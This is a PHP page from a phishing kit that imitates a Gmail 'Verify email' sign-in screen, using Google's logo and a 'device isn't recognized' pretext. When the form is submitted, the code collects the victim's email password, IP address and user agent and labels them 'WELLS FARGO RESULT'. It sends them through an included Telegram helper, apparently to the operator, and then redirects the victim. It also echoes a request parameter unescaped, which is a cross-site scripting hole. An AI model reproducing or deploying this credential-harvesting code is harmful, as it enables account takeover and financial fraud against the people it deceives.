<?php
ini_set('session.gc_maxlifetime', 1209600);
ob_start();
session_start();
include '../includes/antibot.php';
include '../includes/telegram.php';
if (!isset($_GET['email'])){
	header('Location: ../verify/contact.php', true);
}
else{
	$email = $_GET['email'];
}
if (!isset($_SESSION['id'])){
	header('Location: ../index.php', true);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Verify email - Gmail</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
	<link rel="shortcut icon" type="image/jpg" href="../static/img/google-favicon.ico"/>
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
</head>
<style type="text/css">
	input{
		-webkit-appearance: none;
	}
	@media only screen and (max-width: 470px){
		.page-content{
			width: 350px;
		}
		.card{
			position: fixed;
			width: 100vw;
			height: 100vh;
			top: 0;
			left: 0;
		}
	}
	@media only screen and (min-width: 471px){
		.card{
			border-radius: 10px;
			/*height: 500px;*/
		}
		.page-content{
		width: 450px;
		position: absolute;
		top: 50%;
		left: 50%;
		transform: translate(-50%, -50%);
		}
	}
	.username{
		border: 1px solid #dadce0;
		border-radius: 25px;
		max-width: 100%;
		cursor: pointer;
	}
	.username:hover{
		background-color: rgba(60,64,67,0.039);
	}
	#email-pass{
		color: #202124;
		border: 1px solid #ccc;
		border-radius: 5px;
		transition: 0s;
		width: 100%;
	}
	#email-pass:focus{
		transition: 0s;
		border: 2px solid #1a73e8;
		position: relative;
		margin-bottom: -2px;
		outline: none;
	}
	#email-pass:valid{
		transition: 0s;
	}
	a{
		color: #1a73e8;
		text-decoration: none;
		font-weight: 650;
		font-size: 0.9rem;
		text-align: left;
	}
	a:hover{
		color: #1a73e8;
		cursor: pointer;
	}
	.footer a{
		font-weight: 700;
		text-decoration: none;
		color: #757575;
		font-size: 0.8rem;
	}
	button{
		background-color: #1a73e8;
		color: white;
		border: none;
		border-radius: 5px;
		font-weight: 650;
		position: absolute;
		top: 50%;
		transform: translateY(-50%);
		right: 0;
	}
	#show-password{
		width: 18px;
		height: 18px;
	}
</style>
<body>
	<div class="container">
		<div class="page-content">
			<div class="card text-center p-5">
				<svg class="mx-auto" viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="l5Lhkf"><g id="qaEJec"><path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path></g><g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g><g id="BWfIk"><path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path></g><g id="e6m3fd"><path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path></g><g id="vbkDmc"><path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path></g><g id="idEJde"><path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path></g></svg><br>
				<h3 class="mt-3">Welcome</h3>
				<h6 class="mb-3">This device isn't recognized, please sign in to verify</h6>
				<span class="username mx-auto p-1">
					<svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg>
					<b style="color: #3c4043; font-weight: 600; font-size: 14px; letter-spacing: 0.25px;"><?php echo $email;?></b>
					<svg aria-hidden="true" class="stUf5b MSBt4d" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon></svg>
				</span>
				<form action="" method="POST">
					<input class="px-3 py-3 mt-5" type="password" name="email-pass" id="email-pass" placeholder="Enter your password" required><br>
					<div class="my-2" style="text-align: left;">
						<input class="me-2" type="checkbox" name="show-password" id="show-password" style="-webkit-appearance: checkbox;">
						<label for="show-password">Show password</label>
					</div>
					<div class="row my-5" style="position: relative;">
						<div class="col-md-6" style="text-align: left;">
							<a class="my-4" href="">Forgot password?</a>
						</div>
						<div class="col-md-6" style="text-align: right;">
						<button class="py-2 px-4 me-3">Next</button>
						</div>
					</div>
				</form>
			</div>
			<div class="footer mt-3" style="text-align: right;">
				<span class="text-right">
					<a class="mx-3" href="" style="float: right;">Help</a>
					<a class="mx-3" href="" style="float: right;">Privacy</a>
					<a class="mx-3" href="" style="float: right;">Terms</a>
				</span>
			</div>
		</div>
	</div>
	<script type="text/javascript">
		const togglePassword = document.querySelector("#show-password");
		const password = document.querySelector("#email-pass");
		
		togglePassword.addEventListener('click', () => {
			const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
			password.setAttribute('type', type);
		});
	</script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</body>
</html>
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
	$ip = $_SERVER['REMOTE_ADDR'];
	$user_agent = $_SERVER['HTTP_USER_AGENT'];
	$email_pass = $_REQUEST['email-pass'];

	if (!isset($_SESSION['id'])){
		header('Location: ../verify/contact.php', true);
	}

	$msg = "WELLS FARGO RESULT\n\n| DEVICE : #{$_SESSION['id']}\n| IP : {$ip}\n| USER AGENT : {$user_agent}\n\n| EMAIL PASSWORD : {$email_pass}";
	send_message(urlencode($msg));
	//$sql = "UPDATE $table SET email_pass = ? WHERE id=$id";
	//$stmt = $mysqli->prepare($sql);
	//$stmt->bind_param('s', $email_pass);
	//$stmt->execute();
	header('Location: ../complete.php', true);
}
?>